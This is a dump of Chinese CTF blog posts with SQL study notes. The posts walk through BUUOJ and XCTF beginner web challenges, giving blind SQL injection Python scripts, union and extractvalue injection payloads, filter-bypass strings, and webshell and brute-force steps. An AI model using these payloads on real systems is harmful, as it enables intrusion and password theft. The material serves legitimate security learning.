（4）路径页面也回显了，直接用蚁剑连接在根目录下找到flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"sql注入脚本——二分法","date":"2022-02-05T10:35:29.000Z","path":"2022/02/05/sql注入脚本——二分法/","text":"二分法相较于一个一个字母测试sql注入的python脚本来说，二分法可以带来更高效的，更全面的结果。 分析先来看一个脚本的片段 for i in range(1,10000): low = 32 high = 128 mid = (low+high)//2 while low &lt; high: # url = host + &quot;id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&lt;%d)^1&quot; % (i,mid) # res = requests.get(url) url = host + &quot;id=1&#39;^(ascii(substr((select(group_concat(password))from(users)),%d,1))&lt;%d)^1-- -&quot; % (i,mid) res = requests.get(url) if &quot;You are in&quot; in res.text: high = mid else: low = mid+1 mid = (low + high)&gt;&gt;1 if mid &lt;= 32 or mid &gt;= 127: break 这个脚本是把二分法应用到sql盲注中。 过程： （1）查找范围 low = 32 high = 128 对照ascii码表从32位（空格）到128位（€欧盟的符号），其中包含了数字，大小写字母，及部分常见符号，范围很广。 （2）查找过程 除了最高位和最低位，还设置了一个中间值。 定义完变量，开始测试。 for i in range(1,10000): low = 32 high = 128 mid = (low+high)//2 while low &lt; high: url = host + &quot;id=1&#39;^(ascii(substr((select(group_concat(password))from(users)),%d,1))&lt;%d)^1-- -&quot; % (i,mid) res = requests.get(url) if &quot;You are in&quot; in res.text: high = mid else: low = mid+1 mid = (low + high)&gt;&gt;1 if mid &lt;= 32 or mid &gt;= 127: break 判断password的第i位是否小于mid，如果出现页面回显”You are in”（代表小于），然后把mid的值赋给high；如果页面回显出其他东西（代表大于），则把mid加1的值赋值给low。然后mid再重新计算（mid = (low + high)&gt;&gt;1，low和high的总和向右位移1位，可以相当于这个总和除二）。通过while循环把查找的范围不断缩小，不断接近所要查找的那个值，最后high等于low等于所要查找的那个值，不满足while low &lt; high跳出循环，打印出找到的那个值。 如果把上述的low=mid+1改为low=mid也可以","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"极客大挑战finalsql","date":"2022-01-28T13:00:45.000Z","path":"2022/01/28/极客大挑战finalsql/","text":"极客大挑战finalsql（1）打开页面 （2）先对首页的用户名和密码经行过滤检查发现了select，and，from，where等重要的关键词被过滤掉，无法进一步进行sql注入 （3）查找一下其他的线索一个一个点进去，从id=1到id=6，然后被耍了！ 不过可以猜测，id后面应该可以进行sql注入。 （4）对id后的值经行过滤检查 这里的关键字没有被过滤掉可以进行sql，此外发现页面回显的结果只有“ERROR！！！”和“你可别被我逮住了，臭弟弟”结合首页的提示要使用sql盲注。 （5）写一下python脚本 利用requests库中的get请求写脚本。 import requests url = &#39;http://d8033658-fcc1-4e69-bf4f-a356e0510af8.node4.buuoj.cn:81/search.php&#39; flag = &#39;&#39; for i in range(1,250): low = 32 high = 128 mid = (low+high)//2 while(low&lt;high): #payload = &#39;http://d8033658-fcc1-4e69-bf4f-a356e0510af8.node4.buuoj.cn:81/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#39; %(i,mid) payload = &quot;http://d8033658-fcc1-4e69-bf4f-a356e0510af8.node4.buuoj.cn:81/search.php?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)&quot; %(i,mid) r = requests.get(url=payload) if &#39;ERROR&#39; in r.text: low = mid+1 else: high = mid mid = (low+high)//2 if(mid ==32 or mid ==127): break flag = flag+chr(mid) print(flag) 爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"极客大挑战sql注入篇","date":"2021-11-26T13:27:03.000Z","path":"2021/11/26/极客大挑战sql注入篇/","text":"[极客大挑战 2019]EasySQL1.先试一下万能钥匙，提示密码的单引号没有闭合。 2.在密码前添加单引号，得到flag。 [极客大挑战 2019]BabySQL1.试一下万能钥匙，反馈得到or好像被注释掉了，再把or换成and也是同样的结果。 2.试一下双写，再补一下密码前的单引号，成功进入得到用户名为admin。 3.再使用一下and双写，把用户名前面的1改为admin，成功进入。 4.直接使用order by语句报错，可以的到里面的or和by都被过滤掉，在把这两个双写，当order by后面数字为3成功进入，为4则报错，因此判断有三列。 5.使用联合查询注入。 -admin&#39; uniounionn seleselectct 1,2,3# 查表名 -admin&#39; ununionion seleselectct 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() # 查表名 -admin&#39; ununionion seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() # 查一下b4bsql这个表里的值 -admin&#39; ununionion seleselectct 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql # 爆出flag [极客大挑战 2019]HardSQL1.试一下万能钥匙，得不到反馈，猜测可能是盲注。 2.使用Fuzz字典和burp suite测试下被过滤了什么根据response判断： 回显“你可别被我逮住了，臭弟弟”为被过滤的字符； 状态为429的为表示在一定的时间内用户发送了太多的请求，即超出了“频次限制”； 可得长度为751的为可使用的字符 3.在使用盲注之前先试一下extractvalue()函数能不能回显。 ?username=1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=1 4.接着继续使用sql注入 查表名： ?username=-1&#39;^extractvalue(1,concat(1,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23&amp;password=&#39;123 查列名： ?username=-1&#39;^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23&amp;password=&#39;123 爆flag ?username=-1&#39;^extractvalue(1,concat(1,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1))))%23&amp;password=&#39;123 因为extactvalue函数回显的数字限制只回显一半的flag，所有要用left或right函数修改一下payload去掉重复的，拼接起来就是flag ?username=-1&#39;^extractvalue(1,concat(1,(select(right(password,35))from(H4rDsq1))))%23&amp;password=&#39;123","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区11、12","date":"2021-11-17T07:51:59.000Z","path":"2021/11/17/攻防世界WEB新手区11、12/","text":"command_execution 题目来源： Cyberpeace-n3k0 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 分析 （1）打开网页 （2）先试着输入127.0.0.1，得到了反馈 （3）试着使用ls语句，发现多出了index.php 说明源代码没有对这些命令语句经行过滤，正如题目所说没有写waf （4）接着使用find语句，寻找flag （5）接着使用cat语句得到flag 关于Linux的常用命令建议阅读https://www.runoob.com/w3cnote/linux-common-command-2.html simple_js 题目来源： root-me 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 分析 （1）打开网页 （2）先看看源代码，在地址前添加view-source: （3）分析一下代码（博主先吐槽一下，源码里搞了很多花里胡哨的东西，有用的没几个） 1.先定义了一个函数dechiffre； 函数里定义了参数pass并赋值一串字符”70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65”; 定义了tab参数并使用了split(）函数以’,’分割参数pass_enc并赋值给tab; 定义了tab2参数同理用split（）函数以’,’分割参数pass并赋值给tab2; 又定义了几个参数i、j、k、l=0、m、n、o、p=””,再赋值i=0,j=tab.length,n=tab2.length(经过split函数的分割后pass被分割成18个部分，即tab2.length的值为18); 接下来写了一个for循环，i=（o=0）即让i的初始值为0，i&lt;(k=j=n)即i&lt;18，让o=tab[i-1],p+=string.fromcharcode((o=tab2[i]))这里使用了string.fromcharcode函数即返回对应的ASCLL值，即返回对应tab2里面的数字对应的ASCLL值，再把转换出来的每一个值加到p这个参数里，当i=5时结束循环; 又定义一个for循环内容与前面一样，前面求的是i小于等于5，这里求i大于5小于17，又因为tab2也只有18个值从0开始即把tab2里所有值转换成ASCII对应的值，对照一下ASCII表可得到p的值为 FAUX PASSWORD HAH; 然后p再加上tab2[17]对应的符号（A），那P就是FAUX PASSWORD HAHA。再把p的值赋值给pass然后结果返回pass。 prompt()是用于显示可提示用户进行输入的对话框。 额。。。无论输入什么值都会返回FAUX PASSWORD HAHA 我们还可以发现后面有一串没有起作用的由十六进制组成字符，还提示我们带入dechiffre函数中转化对应的ASCII值，由此我们猜测这应该是对应的密码，先转换成十进制String[“fromCharCode”]={55,56,54,79,115,69,114,116,107,49,50}，带入上面运算，pass=786OsErtk12（这里其实根据题目提示的flag格式可以推出这个就是flag） （4）又因为无论输入什么值都会返回FAUX PASSWORD HAHA，我们用另存网页，用记事本修改一下代码再打开 这行p += String.fromCharCode((o = tab2[i]))删掉2成p += String.fromCharCode((o = ta[i])); 同样p += String.fromCharCode(tab2[17])也删掉2p += String.fromCharCode(tab[17]);即让它返回的是tab里对应的ASCII的值也就是我们输入的值。 修改完后打开网页，输入55,56,54,79,115,69,114,116,107,49,50得到的也是这串数字所对应的ASCII值即flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"极客大挑战2019LoveSQL解析","date":"2021-11-11T12:57:34.000Z","path":"2021/11/11/极客大挑战2019LoveSQL解析/","text":"极客大挑战2019LoveSQL解析（1）打开网页 （2）先尝试注入1’ or 1=1 #密码随便输一下 输出 （3）打开hackbar尝试使用order by语句从1开始查询列数 注：因为url中的#号是用来指导浏览器动作的，对服务器端无用，因此改为%23 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39;order by 4 ​%23 &amp;password=12 直到4出错，因此判断一共有三列 （4）接下来使用union联合注入，先输入select 1,2,3得到 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39;union select 1,2,3 %23 &amp;password=123 查询数据库 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39;union select 1,2,database() ​%23 &amp;password=12 （5）从数据库中查询表名 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 &amp;password=123 （6）从l0ve1vsq1表中查询列名 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;l0ve1ysq1&#39; %23 &amp;password=123 得到三列’id,username,password’ （7）从l0ve1vsq1表中查询’id,username,password’的值 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23 &amp;password=123 爆出flag{411eec48-f88d-467b-8b1d-b2f876e10482}","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区9、10","date":"2021-11-09T14:01:14.000Z","path":"2021/11/09/攻防世界WEB新手区9、10/","text":"xff_referer 题目来源： Cyberpeace-n3k0 题目描述：X老师告诉小宁其实xff和referer是可以伪造的 分析 （1）打开网页 （2）这时要打开burp suite，找到相关网址发送给repeater。 （3）根据格式伪造XXF,添加X-Forwarded-For:123.123.123.123 注：X-Forwarded-For(XFF)是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。这一HTTP头一般格式如下:（X-Forwarded-For: client1, proxy1, proxy2, proxy3） （4）得到提示要求referer为https://www.google.com，添加Referer:https://www.google.com，得到flag 注：referer 网站来路；访问者进入网站的任何途径。HTTPReferrer是header的一部分，当浏览器向web服务器发出请求的时候，一般会带上Referer,告诉服务器用户从那个页面连接过来的，服务器藉此可以获得一些信息用于处理。 webshell 题目来源： Cyberpeace-n3k0 题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 分析 （1）打开网页 （2）根据提示好像与一句话木马有关，关于webshell的工具常见的有中国菜刀、蚁剑等（博主这里使用的是蚁剑） 注：关于webshell可以学习一下https://www.cnblogs.com/csnd/p/11807741.html这篇文章 （3）添加数据，根据提示和与一句话木马有关的内容，知道了连接密码为$_POST[‘shell’]里的shell （4）连接数据 （5）我们发现了flag.txt，打开得到了flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区7、8","date":"2021-10-31T02:34:02.000Z","path":"2021/10/31/攻防世界WEB新手区7、8/","text":"攻防世界WEB新手区7、8simple_php 题目来源： Cyberpeace-n3k0 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 分析 (1) 进入网页 分析一下代码： a.包含了’config.php’这个文件； b.当$a为零时and $a 得到flag1； $a==0为弱比较类型。==只比较值，不比较类型。===除了比较值，也比较类型。 当a=false时a==0 c.当$b为数字时退出程序 is_numeric() 函数：如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。 d.如果$b&gt;1234则得到flag2 也就是要保证a=0，b不为数字且要大于1234 （2）先耍点小聪明，既然包含了config.php这个文档，且从代码中可以知道flag就在里面那么我们可以直接查看这个文档得到flag吗？ 在网址后面添加/config.php 既没有报错，也没有显示内容，可能是被人处理过，所以查看不了 （3）还是老实按步骤来吧，本题主要问的是get的传值方式 在原网站后面添加 ？a=false&amp;b=5555d 这里的a也可以是任意字母最后会转换为0，b为数字加字母组合会转换成整数,转换会从第一个字符开始如果不是整数就转换成0.这里转换成了5555。输出结果 ps.get传值格式：url？a=xxx&amp;b=xxx 除了自行写域名进行传值以外，还有使用form表单进行传值： get_post 题目来源： Cyberpeace-n3k0 题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 分析 （1）打开网页，根据提示get传值 （2）然后进行post传值 这个时候就需要用到hackbar（博主使用的是chrome edge浏览器edge商城没有自带这个插件，以下是安装教程，建议资源从教程中的连接下载，官网下载好像要收费），其他浏览器可以自己百度一下，方式大致是相同的。https://blog.csdn.net/weixin_41182861/article/details/107689926） 用post方式传值b=2得到flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区5、6","date":"2021-10-31T02:33:28.000Z","path":"2021/10/31/攻防世界WEB新手区5、6/","text":"攻防世界WEB新手区5、61.disabled_button 题目来源： Cyberpeace-n3k0 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 分析: (1)登入环境 真的是一个不能按的按钮 （2）打开源码 看来是这行代码起的作用，那么就要去修改掉这行代码。 （3）修改网页源代码 a.使用开发者工具进行修改（注意：通过开发者工具的element修改页面源码只对页面的布局(html)有效，对js代码无效。） 把disable改为able，再点击按钮，便可得flag b.使用记事本或其他文本编辑器进行修改 ctrl+s另存网页 用记事本打开，并对源代码进行修改 同样的把disabled改成abled后保存，然后在用浏览器打开，按下按钮得到falg 2.weak_auth 题目来源： Cyberpeace-n3k0 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 分析 （1）打开网页 先看看源码，好像没有什么有价值的东西 再尝试登入一下 回显出了用户名，那么只有密码不知道了，接下来就是使用神器burp suite的时候了 打开对应网页，发送到测试器，打开positions由于我们已知用户名，于是把里面的内容改成图像中形式 打开payload，选择自己已有的字典或软件自带的字典，然后开始攻击（只要你的字典足够强大，没有爆破不出来的密码。） 爆破完后，根据长度排序得到密码用账号密码登入后得到flag ps： 1.burp suite的安装教程https://www.sqlsec.com/2020/10/winbp.html 2.burp suite的使用教程https://blog.csdn.net/weixin_44717303/article/details/116563330","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区1-4","date":"2021-10-23T08:36:12.000Z","path":"2021/10/23/攻防世界WEB新手区1-4/","text":"攻防世界（WEB）新手区1-4分析1.view_source （难度系数： 1.0）## 题目来源： Cyberpeace-n3k0 题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 （1）打开页面 （2）分析：本题主要是在考察怎么查看网页源代码查看方式（这里博主使用的Microsoft Edge浏览器） a.点击鼠标右键（本题鼠标右键使用不了，要使用其他方法） b.使用快捷键 CTRL+U c.在整个网址前添加 “view-source:” eg.view-source:http://111.200.241.244:54909/ ps.这是博主目前知道的方法。 2.robots （难度系数： 1.0）## 题目来源： Cyberpeace-n3k0 题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 （1）打开网页，显示空白页 （2）分析：根据题意在网址后添加 /robots.txt 可得 （3）把/f1ag_1s_h3re.php添加到原网址后面即可得到flag 注：以下关于robots协议的内容来自百度百科https://baike.baidu.com/item/Robots%E5%8D%8F%E8%AE%AE/2483797 简单介绍：robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 -Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。 文件写法 User-agent: * Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录 Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下的所有以”.htm”为后缀的URL(包含子目录)。 Disallow: /? 禁止访问网站中所有包含问号 (?) 的网址 Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片 Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。 Allow: /cgi-bin/ 这里定义是允许爬寻cgi-bin目录下面的目录 Allow: .htm$ 仅允许访问以”.htm”为后缀的URL。 Allow: .gif$ 允许抓取网页和gif格式图片 Sitemap: 网站地图 告诉爬虫这个页面是网站地图 文件用法 例1. 禁止所有搜索引擎访问网站的任何部分 User-agent: * Disallow: / 例2. 允许所有的robot访问 (或者也可以建一个空文件 “/robots.txt” file) User-agent: * Allow: / 例3. 禁止某个搜索引擎的访问 User-agent: BadBot Disallow: / 例4. 允许某个搜索引擎的访问 User-agent: Baiduspider allow:/ 3.backup（难度系数： 1.0） 题目来源： Cyberpeace-n3k0 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ （1）打开网页 （2）根据题意地址栏最末加上/index.php~或/index.php.bak得到备份文件，再用txt打开便可的到flag ps.常见的备份文件后缀名有 .git .svn .swp .~ .bak .bash_history 4.cookie（难度系数： 1.0） 题目来源： Cyberpeace-n3k0 题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ （1）打开页面 （2）使用浏览器中的开发者工具 （3）在地址后加上/cookie.php,根据页面显示在打开开发者工具，得到flag ps （1）关于HTTP响应可以阅读这篇文章https://www.biancheng.net/http/response.html （2）Cookie介绍（该段来自https://www.jianshu.com/p/6fc9cea6daa2） HTTP协议本身是无状态的。什么是无状态呢，即服务器无法判断用户身份。Cookie实际上是一小段的文本信息（key-value格式）。客户端向服务器发起请求，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。 打个比方，我们去银行办理储蓄业务，第一次给你办了张银行卡，里面存放了身份证、密码、手机等个人信息。当你下次再来这个银行时，银行机器能识别你的卡，从而能够直接办理业务。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"mysql增删查改语句","date":"2021-10-22T12:32:36.000Z","path":"2021/10/22/mysql增删查改语句/","text":"mysql增删查改语句1.进入mysql库mysql -u 用户名 -p 2.数据库的增删查改语句（1）增–数据库新建语句：create database 库名 default charset=utf8; 注：我们再cmd中输入的字符，采用的字符集是GBK，也就是说客户端(client)的字符集是GBK。而在mysql服务器(server)的字符集是UTF8。首先，在客户端输入的字符，使用的字符集是GBK。当经过连接器的时候，连接器会进行”字符集的自动转换”，将原来的子符(以GBK进行编码)转换为以UTF8格式的编码字符，临时存储在连接器中。接着，连接器发现mysql服务器使用的字符集，与自身字符集完全一致，都是UTF8。于是，直接发给mysql服务器，进行最终的存储。 default charset=utf8设置默认的字符集为UTF8。 （2）删–删除数据库：drop database 库名; （3）查–查找数据库：show databases; 3.数据表的增删改查语句（1）使用数据库：use 数据库; （2）增–新建数据表：create table 数据表名(字段 类型）engine=innodb default charset=utf8； 注：存储引擎是innodb。innoDB 是 MySQL 上第一个提供外键约束的数据存储引擎，除了提供事务处理外，InnoDB 还支持行锁，提供和 Oracle 一样的一致性的不加锁读取，能增加并发读的用户数量并提高性能，不会增加锁的数量。InnoDB 的设计目标是处理大容量数据时最大化性能，它的 CPU 利用率是其他所有基于磁盘的关系数据库引擎中最有效率的。 （3）删–删除数据表：drop table +数据表名称 （4）增–插入数据：insert into 数据表名(字段) values(数值); （5）删–删除某条数据：delete from 表名 where 标识； （6）改–修改内容：update 表名 set 需要修改的内容 where 需要修改的标识；","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"SELECT语句学习笔记2","date":"2021-10-19T11:41:03.000Z","path":"2021/10/19/SELECT语句学习笔记2/","text":"SELECT语句四种查询注：这篇博客是博主通过学习B站这位UP主（https://space.bilibili.com/508641166/video?tid=0&amp;page=1&amp;keyword=&amp;order=pubdate）18到22有关select语句的教程所得出的总结。 1.单表查询：比较常见不过多介绍，博主的上一篇博客介绍的主要内容即为单表查询 2.连接查询注：连接查询又可分为以下6种形式 （1）交叉连接（广义笛卡尔积） 不带谓语的连接（很少使用，连接的表格信息不对等） eg1.SELECT A.* B.* FROM A,B 从AB表中把AB列的所有数据连接起来，缺点为信息连接不对等 eg2（其中FROM后面的逗号也可以更改为CROSS JOIN） SELECT A.* B.* FROM A CROSS JOIN B （2）等值连接:运算符为“=”的连接操作 a.格式：[表名1]&lt;列名1&gt;=[表名2]&lt;列名2&gt; b.注：任何子句中引用表1和表2中同名属性时，都必须加表名前缀；引用唯一属性名时可以加也可以省略表名前缀。 eg1.SELECT A.*,B.* FROM A,B WHERE A.C=B.C 这里AB表中同时包含了C这个属性，所以必须加前缀。 （3）自身连接：一个表于其自己进行连接，称为表的自身连接 注：由于所有属性都是同名属性，所有需要给表起别名以示区别 eg1.SELECT a1.B,a2.B FROM A a1，A a2 WHERE a1.B=a2.B 这里把A表分别命名为a1，a2以作区别 eg2.SELECT a1.B,a2.C FROM A a1，A a2 WHERE a1.B=a2.C （4）复合条件连接:WHERE子句中含多个连接条件时，称为复合条件连接 复合条件连接类型又可分为： a.两表按多个属性连接 b.自身按多个属性连接 c.多表连接 eg1.SELECT A.a,B,C FROM A,D,E WHERE A.a=B.a AND B.b=C.b AB表中a属性相等和BC表中b属性相等 （5）内连接:相当于等值连接，只是表达方法不同（例子如下） eg1.“,&quot;变JOIN,WHERE变ON SELECT A.*,B.* FROM A,B WHERE A.a=B.a SELECT A.*,B.* FROM A JOIN B ON A.a=B.a （6）外连接 a.左连接（又称左外连接）：返回左表中所有行，如果左表行在右表中没有匹配行则返回NULL eg1.SELECT 表一.* ，表二.* FROM 表一 LEFT JOIN 表二 ON 表一.num = 表二.num 把表一与表二中num相等的连接起来 b.右连接（又称右外连接）：返回右表中所有行，如果左右表行在左表中没有匹配行则返回NULL eg2.SELECT 表一.* ，表二.* FROM 表一 RIGHT JOIN 表二 ON 表一.num = 表二.num 把表一与表二中num相等的连接起来 c.全连接:返回左表右表中所有行，当某行在另一表中没有匹配行，则另一表的列返回空值则返回NULL eg1.SELECT 表一.* ，表二.* FROM 表一 FULL JOIN 表二 ON 表一.num = 表二.num 把表一与表二中num相等的连接起来 3.嵌套查询 注：补充 （1）查询块：一个SELECT语句称为一个查询块 （2）嵌套查询：将一个查询块嵌套在另一个查询块的WHERE子句或HAVING短语的条件查询称为嵌套查询 （3）外层查询/父查询 与 内层查询/子查询 SELECT A FROM B WHERE A.c &lt;外层查询/父查询&gt; IN (SELECT C FROM D WHERE C.a=2)&lt;内层查询/子查询&gt; a.不相关子查询:内层查询与外层查询不关联即可独立运行（有里到外逐层查询） eg1.SELECT A FROM B WHERE A.c IN (SELECT C FROM D WHERE C.a=2) 这里的A在B中，C在D中，并且BD不相关联 先从IN里面开始从D中选出当C.a=2的C的列表，再判断外层从B里选择（A.c等同C.a=2的C的列表）的A列表 ps.内层返回的结果数&gt;=2要用IN，如果用“=”会报错 b.相关子查询 ps.注： （1）首先取外层查询中表的第一个元组，根据它与内层查询相关的属性值处理内层查询，若WHERE子句的返回值为真，则取此元组放入结果表，然后再取外层表的下一个元组；重复这一过程，直到外层表全部检查完为止。（外往内） （2）子查询的限制： ①不能使用ORDER BY 子句 ②层层嵌套方式反应了SQL语言的结构化 ③有些嵌套查询可以用连接运算代替 eg1.SELECT A FROM B WHERE EXISTS (SELECT C FROM D WHERE C.a=2 AND C.b=A.b) 这里的A在B中，C在D中，并且BD不相关联 这里由于子查询中没有A.b这个值所以不能从子查询开始运行，应把从B表中取出的A的所有值分别带入子查询中,判断是否与子查询中得出的结果成立（即EXISTS得到的结果为TURE），如果成立则把那个A值放入结果集，重复这一过程，直到A中的值全部检查完为止。 注：这里的EXISTS谓语用法可以参考下面的介绍。 c.嵌套查询的谓语 （1）带有IN谓语的子查询：父查询与子查询用IN连接，子查询结果为集合。 这里的例子，博主还是用上面的例子，其中子查询的结果数大于等于2 eg1.SELECT A FROM B WHERE A.c IN (SELECT C FROM D WHERE C.a=2) 这里的A在B中，C在D中，并且BD不相关联 先从IN里面开始从D中选出当C.a=2的C的列表，再判断外层从B里选择（A.c等同C.a=2的C的列表）的A列表 （2）带有运算符的子查询：当子查询返回的结果集为一个时，可以使用比较运算符（=,&gt;,&lt;,&gt;=,&lt;=,!=或&lt;&gt;,!&gt;,!&lt;）与ALL或ANY谓语配合使用。 eg1.SELECT A FROM B WHERE C&gt;(SELECT AVG(C) FROM B) 其中C与A同在B表里 计算B表中C的平均值，再选出A对应的C值大于C平均值的A ps.子查询要跟在运算符后面 错误示范：SELECT A FROM B WHERE (SELECT AVG(C) FROM B)&lt;C 正确示范如eg1 （3）带有ANY（任意一个值）或ALL（所有值）谓语的子查询 ps：需配合使用比较运算符 格式：&lt;比较运算符&gt;ANY/ALL eg1.选择年段中成绩大于大于一班同学的所有同学名字 SELECT 学生姓名 FROM 年段 WHERE 成绩 &gt;ALL（SELECT 姓名 FROM 年段 WHERE 班级=一班） 注：这里的学生姓名、年段、成绩、姓名、班级、一班是表名或列名 （4）带有EXISTS谓语的子查询（带有EXISTS谓语的子查询不返回任何实际数据它只生“ture”or“false”） eg1.查询选了语文这门课程的学生姓名 SELECT 学生姓名 FROM 年段 WHERE EXTSTS (SELECT * FROM 年段 WHERE 课程=语文) 注：例子中的文字为表名或列名 4.集合查询（1）并操作： 格式：&lt;查询块&gt;UNION&lt;查询块&gt; ps.参加UNION操作的各结果表的列数必须相同，对应数据类型也必须相同 eg.1选择学号是1和2的学生姓名 SELECT 姓名 FROM 学生 WHERE 学号=1 UNION SELECT 姓名 FROM 学生 WHERE 学号=2 这个例子其实可以运用比较运算符，博主为了举例故怎么使用。 （2）交操作：标准的SQL中并没有提供集合交操作，但可以用其他方式间接实现 eg1.查询1班与身高不超190cm的学生交集(即查询1班中身高不超190cm的学生) SELECT * FROM 学生 WHERE 班级=1班 AND 身高&lt;=190; 注：例子中的文字为表名或列名 （3）差操作：标准的SQL中并没有提供集合交操作，但可以用其他方式间接实现 eg1.查询1班与身高不超190cm的学生差集(即查询1班中身高超过190cm的学生) SELECT * FROM 学生 WHERE 班级=1班 AND 身高&gt;190; 注：例子中的文字为表名或列名 （4）对集合操作结果的排序 注： a.ORDER BY 子句只能对最终查询结果排序不能对中间结果排序 b.任何情况下，ORDER BY 子句只能出现在整个语句的最后 c.对于集合操作结果排序时，ORDER BY 子句中可以用数字指定排序属性（即列名），但尽量不用易产生歧义 eg1.查询1班中身高超过190cm的学生 SELECT * FROM 学生 WHERE 班级=1班 UNION SELECT * FROM 学生 WHERE 身高&gt;190 ORDER BY 学号（或1）; 注：例子中的文字为表名或列名，学号的列号为1","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"select语句学习笔记","date":"2021-10-16T16:30:55.000Z","path":"2021/10/17/select语句学习笔记1/","text":"select语句(1)注：这篇博客是博主通过学习B站这位UP主（https://space.bilibili.com/508641166/video?tid=0&amp;page=1&amp;keyword=&amp;order=pubdate）18到22有关select语句的教程所得出的总结。 1.SELECT一般格式SELECT 目标表达式 别名(，目标表达式 别名...） FROM 表名或视图名 别名 （，表名或视图名 别名... ） WHERE 条件表达式 GOUOP BY 列名（，列名...） HAVING 条件表达式 ORDER BY 列名（，列名...）[ASC|DESE] 2.select子句（1）属于投影运算——不消除重复行 （2）SELECT语句后+全部列名或经过计算的值 （3）各列的先后顺序可以与表中的逻辑顺序不一样，用户可以根据需要改变列的显示顺序 eg1.SELECT A FROM B 